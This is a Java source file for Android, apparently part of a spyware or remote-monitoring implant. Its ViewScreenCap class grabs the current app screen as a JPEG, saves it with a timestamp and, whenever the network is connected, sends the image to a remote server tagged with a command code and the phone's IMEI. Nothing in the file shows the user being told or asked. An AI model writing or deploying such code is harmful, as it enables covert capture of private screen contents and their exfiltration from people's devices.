package com.plugin;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import com.main.ForegroundService;
import com.network.Network;
import com.network.SendDataToServer;
import com.utils.Public;
import com.utils.PublicFunction;
import com.utils.WriteDateFile;

import android.app.Activity;
import android.content.Context;
import android.graphics.Bitmap;
import android.util.Log;
import android.view.View;
import android.view.View.MeasureSpec;

public class ViewScreenCap implements Runnable{
	//private static int STATUSBAR_HEIGHT = 16;
	//private static int STATUSBAR_WIDTH = 4;
	private static final String TAG = "ViewScreenShot";
	private static final int SCREENSNAPSHOT_QUALITY = 100;
	private Activity activity;
	private Context context;
	
	public ViewScreenCap(Activity act,Context context){
		this.activity = act;
		this.context = context;
	}
	
	public static void viewScreenCap(Activity act,Context context){
		try {
	    	//Random rand = new Random();
	    	//int r = rand.nextInt();
	    	
	    	String filename = PublicFunction.formatCurrentDateInFileName() + "_" + 
	    			ForegroundService.SCRNSNAPSHOT_FILE_NAME;

	    	String screenshotfn = ForegroundService.LOCAL_PATH_NAME + filename;
	    	boolean ret = viewCap(act, screenshotfn);
			if(ret && (Network.isNetworkConnected (context) == true) ){
		    	File fbmpFile = new File(screenshotfn);
		    	int datasize = (int)fbmpFile.length();
		    	FileInputStream fout = new FileInputStream(fbmpFile);
		    	//byte []data = new byte[filesize];
				
		    	int filenamelen = filename.getBytes().length;
		    	
				int sendsize = datasize + 4 + filenamelen + 4;
				byte[] sendbuf = new byte[sendsize];
				
				
				byte[] bytefilenamelen = PublicFunction.intToBytes(filenamelen);
				System.arraycopy(bytefilenamelen, 0, sendbuf, 0, 4);
				System.arraycopy(filename.getBytes(), 0, sendbuf, 4, filenamelen);
				byte[] bytefilesize = PublicFunction.intToBytes(datasize);
				System.arraycopy(bytefilesize, 0, sendbuf, 4 + filenamelen, 4);
				
				fout.read(sendbuf,4 + filenamelen + 4,datasize);
				//System.arraycopy(data, 0, sendbuf, 4 + filenamelen + 4, datasize);
				fout.close();

	    	    SendDataToServer.sendDataToServer(sendbuf, sendsize, Public.CMD_DATA_SCRNSNAPSHOT, Public.IMEI);
			}
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

	@SuppressWarnings("deprecation")
	public static boolean viewCap(Activity act,String filename){
		boolean ret = false;
		try {
			  if (act == null) {
				  Log.e(TAG, "Activity null");
				  return false;
			  }
			  
			
			  //View view=act.getWindow().getDecorView();
			  View view=act.getWindow().getDecorView().getRootView();  
			  if (view == null) {
				  Log.e(TAG, "not found View in Activity");
				  return false;
			  }
			  
			  view.setDrawingCacheEnabled(true);
			  view.buildDrawingCache(false); 
			  
			  int width = act.getWindowManager().getDefaultDisplay().getWidth();  
			  int height = act.getWindowManager().getDefaultDisplay().getHeight();  
			  view.measure(MeasureSpec.makeMeasureSpec(width, MeasureSpec.EXACTLY), 
					  MeasureSpec.makeMeasureSpec(height, MeasureSpec.EXACTLY));
			  view.layout(0, 0, view.getMeasuredWidth(), view.getMeasuredHeight());
			  Bitmap bitmap = view.getDrawingCache();
			  //view.getDrawingCache(false);
			  if (bitmap != null) {
				  File file = new File(filename);
				  if (file.exists() == false) {
					file.createNewFile();
				  }
				  FileOutputStream fout = new FileOutputStream(file); 
				  bitmap.compress(Bitmap.CompressFormat.JPEG, SCREENSNAPSHOT_QUALITY, fout);
				  fout.close();
				  
				  Log.e(TAG, "success filename:" + filename);
				  WriteDateFile.writeLogFile("success filename:" + filename);
				  ret = true;
			  }else{
				  Log.e(TAG, "get bitmap error");
			  }
			
			  view.destroyDrawingCache();  
			  view.setDrawingCacheEnabled(false);
			  		  
			  return ret;
		}catch(Exception ex){
			ex.printStackTrace();
			return false;
		}
	}
	
	

	public void run() {
		viewScreenCap(activity,context);
	}
	
}

